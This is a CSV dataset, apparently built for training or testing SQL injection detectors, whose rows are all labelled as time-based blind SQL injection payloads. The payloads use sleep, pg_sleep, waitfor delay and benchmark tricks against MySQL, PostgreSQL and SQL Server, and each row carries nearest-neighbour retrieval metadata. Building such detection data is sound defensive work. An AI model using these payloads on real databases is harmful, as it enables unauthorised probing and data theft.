id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000177,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""azzv"" like ""azzv",nearest_attack_euclidean,R000161,0.2962395493246239
SMOTE_000178,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.032509559359816045
SMOTE_000179,attack,time,waitfor delay '0:0:5' and 'gsvt'  =  'gsvt,nearest_attack_euclidean,R000240,0.9043518104717745
SMOTE_000180,attack,time,"1""  )   as lexx where 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000293,0.0466707914059653
SMOTE_000181,attack,time,1'+  (  select 'zjvx' where 4683  =  4683 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000126,0.09087440800847695
SMOTE_000182,attack,time,"select benchmark  (  5000000,md5  (  0x714e4153   )    )   #",nearest_attack_euclidean,R000216,1.0503848713292534
SMOTE_000183,attack,time,1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000153,0.1421994961930917
SMOTE_000184,attack,time,1  )   as rlft where 1670  =  1670 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000119,0.27881073661572
SMOTE_000185,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000066,0.40315832510229754
SMOTE_000186,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim",nearest_attack_euclidean,R000222,0.6775942058204065
SMOTE_000187,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000045,0.7710012235463417
SMOTE_000188,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000057,0.06326727592276438
SMOTE_000189,attack,time,"1'  )   as ohcs where 9588  =  9588 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000221,0.5561136581615296
SMOTE_000190,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.25566702621277315
SMOTE_000191,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000099,0.2434926696814964
SMOTE_000192,attack,time,"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""vxec"" like ""vxec",nearest_attack_euclidean,R000100,0.0637783945172397
SMOTE_000193,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000066,1.1766890606273304
SMOTE_000194,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   #",nearest_attack_euclidean,R000271,0.12763535922397737
SMOTE_000195,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R000244,4.386073898601576
SMOTE_000196,attack,time,1'||  (  select 'jmhb' where 1794  =  1794 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000139,0.616619952697143
SMOTE_000197,attack,time,1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',nearest_attack_euclidean,R000213,0.11949568832528411
SMOTE_000198,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",nearest_attack_euclidean,R000053,1.5855751677906387
SMOTE_000199,attack,time,"waitfor delay '0:0:5' and    (    (   ""ykgm""  =  ""ykgm",nearest_attack_euclidean,R000249,0.1335270423887222
SMOTE_000200,attack,time,1%'  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000225,1.213522014402127
